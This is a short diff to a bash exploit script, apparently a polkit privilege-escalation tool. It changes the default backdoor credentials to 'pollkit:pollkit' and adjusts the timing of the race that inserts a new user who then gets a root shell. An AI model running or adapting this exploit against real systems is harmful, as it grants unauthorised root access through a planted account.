@@ -29,8 +29,8 @@ function usage(){
     echo -e "Equal to symbol (=) after specifying an option is mandatory."
     echo -e "If you don't specify the options, then the script will automatically detect the possible time and"
     echo -e "will try to insert a new user using that time."
-    echo -e "Default credentials are 'secnigma:secnigmaftw'"
-    echo -e "If the exploit ran successfully, then you can login using 'su - secnigma'"
+    echo -e "Default credentials are 'pollkit:pollkit'"
+    echo -e "If the exploit ran successfully, then you can login using 'su - pollkit'"
     echo -e "and you can spawn a bash shell as root using 'sudo bash'"
     printf "${RED}IMPORTANT: THIS IS A TIMING BASED ATTACK. MULTIPLE TRIES ARE USUALLY REQUIRED!!${NC}\n"
     echo -e ""
@@ -197,7 +197,7 @@ function insert_user(){
     time_fetched=$(fetch_timing) 
     
     # Time to sleep
-    timing=$(calculate_timing `echo "0.004"$time_fetched`)
+    timing=$(calculate_timing `echo "0."$time_fetched`)
     
     temp_count=$(inc_float `echo $timing`)
     count=$(float_to_int $temp_count)
